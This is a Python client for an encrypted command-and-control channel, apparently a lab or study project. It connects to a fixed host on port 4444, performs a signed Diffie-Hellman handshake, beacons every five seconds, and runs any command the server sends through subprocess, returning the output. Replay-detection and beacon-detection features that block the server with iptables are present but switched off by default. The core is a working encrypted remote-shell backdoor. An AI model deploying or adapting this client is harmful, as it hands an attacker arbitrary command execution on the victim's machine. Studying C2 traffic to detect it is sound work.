import socket
import time
import subprocess
import os
import base64
import json
import uuid
import threading
import hashlib
import threading

from cryptography.hazmat.primitives.asymmetric import padding, dh
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.fernet import Fernet

HOST = "192.168.100.1"
PORT = 4444

# ================= HASH-BASED LOGGING =================
log_lock = threading.Lock()
prev_hash = "0" * 64  # genesis hash

def log_event(event):
    global prev_hash

    with log_lock:
        safe_event = json.dumps(event)
        
        combined = prev_hash.encode() + safe_event.encode()
        new_hash = hashlib.sha256(combined).hexdigest()

        with open("secure_log.txt", "a") as f:
            f.write(f"{safe_event} | HASH: {new_hash}\n")

        prev_hash = new_hash

# ================= TOGGLES =================
ENABLE_REPLAY_PROTECTION = False
ENABLE_INTERNAL_REPLAY_SIM = False
ENABLE_C2_DETECTION = False

# ================= LOAD SERVER PUBLIC KEY =================
with open("server_public.pem", "rb") as f:
    server_rsa_public = serialization.load_pem_public_key(f.read())

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((HOST, PORT))
client.settimeout(1)

print("[+] Connected to server")

# ================= HANDSHAKE =================
dh_len = int.from_bytes(client.recv(4), 'big')
dh_bytes = client.recv(dh_len)

sig_len = int.from_bytes(client.recv(4), 'big')
signature = client.recv(sig_len)

try:
    server_rsa_public.verify(
        signature,
        dh_bytes,
        padding.PSS(mgf=padding.MGF1(hashes.SHA256()),
                    salt_length=padding.PSS.MAX_LENGTH),
        hashes.SHA256()
    )
    print("[+] RSA verification successful")
except Exception:
    print("[❌] RSA verification failed!")
    client.close()
    exit()

server_dh_public = serialization.load_pem_public_key(dh_bytes)
server_parameters = server_dh_public.parameters()

client_private = server_parameters.generate_private_key()
client_public = client_private.public_key()

client_bytes = client_public.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

client.send(len(client_bytes).to_bytes(4, 'big'))
client.send(client_bytes)

shared_key = client_private.exchange(server_dh_public)

derived_key = HKDF(
    algorithm=hashes.SHA256(),
    length=32,
    salt=None,
    info=b'handshake data'
).derive(shared_key)

current_cipher = Fernet(base64.urlsafe_b64encode(derived_key))
print("[+] Secure channel established!")

# ================= HELPERS =================
def create_message(msg_type, data):
    return json.dumps({
        "ts": time.time(),
        "nonce": str(uuid.uuid4()),
        "type": msg_type,
        "data": data
    }).encode()

def decrypt_message(data):
    return json.loads(current_cipher.decrypt(data).decode())

# ================= REPLAY DETECTION =================
seen_nonces = set()
TIME_WINDOW = 10
last_packet = None

def is_replay(ts, nonce, simulate=False):
    if not ENABLE_REPLAY_PROTECTION:
        return False

    if abs(time.time() - ts) > TIME_WINDOW:
        print("[!] Replay detected (old timestamp)")
        return True

    if nonce in seen_nonces:
        print("[!] Replay detected (duplicate nonce)")
        return True

    if not simulate:
        seen_nonces.add(nonce)

    return False

# ================= KEY ROTATION =================
def handle_rotation():
    global current_cipher

    new_private = server_parameters.generate_private_key()
    new_public = new_private.public_key()

    pub_bytes = new_public.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )

    client.send(current_cipher.encrypt(create_message("KEY_ROTATE_DH", pub_bytes.decode())))

    data = client.recv(4096)
    parsed = decrypt_message(data)

    server_pub = serialization.load_pem_public_key(parsed["data"].encode())

    shared = new_private.exchange(server_pub)

    new_key = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b'rotation'
    ).derive(shared)

    current_cipher = Fernet(base64.urlsafe_b64encode(new_key))

    client.recv(4096)  # COMMIT
    print("[+] Key rotation completed")

# ================= RECEIVER THREAD =================
def recv_loop():
    global last_packet

    while True:
        try:
            data = client.recv(4096)
            if not data:
                break

            parsed = decrypt_message(data)

            # KEY ROTATION
            if parsed["type"] == "KEY_ROTATE_INIT":
                handle_rotation()
                continue

            if parsed["type"] == "CMD":
                last_packet = data

                ts = parsed["ts"]
                nonce = parsed["nonce"]
                command = parsed["data"]

                if not command or not isinstance(command, str):
                    continue

                if is_replay(ts, nonce):
                    continue

                print("[CMD RECEIVED]:", command)
                log_event(f"CMD RECEIVED: {command}")

                if command.lower() == "exit":
                    break

                output = subprocess.getoutput(command)
                log_event(f"RESULT: {output}")

                response = create_message("RESULT", output)
                client.send(current_cipher.encrypt(response))

                # ===== INTERNAL REPLAY SIMULATION =====
                if ENABLE_INTERNAL_REPLAY_SIM:
                    print("[*] Simulating replay...")

                    parsed_replay = decrypt_message(last_packet)
                    ts_r = parsed_replay["ts"]
                    nonce_r = parsed_replay["nonce"]

                    if is_replay(ts_r, nonce_r, simulate=True):
                        print("[!] Replay detected (internal)")
                    else:
                        print("[!] Replay NOT detected (vulnerable)")

        except socket.timeout:
            continue
        except Exception as e:
            print("[ERROR]:", e)
            break

threading.Thread(target=recv_loop, daemon=True).start()

# ================= C2 DETECTION =================
last_time = None
intervals = []
window_size = 5
alert_triggered = False
blocked = False

def block_ip(ip):
    print(f"\n Blocking C2 Server: {ip}\n")
    log_event(f"BLOCKED IP: {ip}")
    os.system(f"sudo iptables -A OUTPUT -d {ip} -j REJECT")
    os.system(f"sudo iptables -A INPUT -s {ip} -j REJECT")

# ================= MAIN LOOP =================
while True:
    try:
        current_time = time.time()

        beacon_msg = create_message("BEACON", "HELLO_FROM_CLIENT")
        client.send(current_cipher.encrypt(beacon_msg))
        log_event("BEACON SENT: HELLO_FROM_CLIENT")

        if ENABLE_C2_DETECTION and last_time is not None:
            interval = current_time - last_time
            intervals.append(interval)

            if len(intervals) > window_size:
                intervals.pop(0)

            print(f"[DEBUG] Interval: {interval:.2f} sec")

            if len(intervals) == window_size:
                avg = sum(intervals) / len(intervals)

                if all(abs(i - avg) < 0.7 for i in intervals):
                    if not alert_triggered:
                        print("\n [ALERT] C2 Beaconing Detected!\n")
                        log_event("ALERT: C2 Beaconing Detected")
                        alert_triggered = True

                        if not blocked:
                            block_ip(HOST)
                            blocked = True
                            break
                else:
                    alert_triggered = False

        last_time = current_time
        time.sleep(5)

    except Exception as e:
        print("[ERROR]:", e)
        break

client.close()
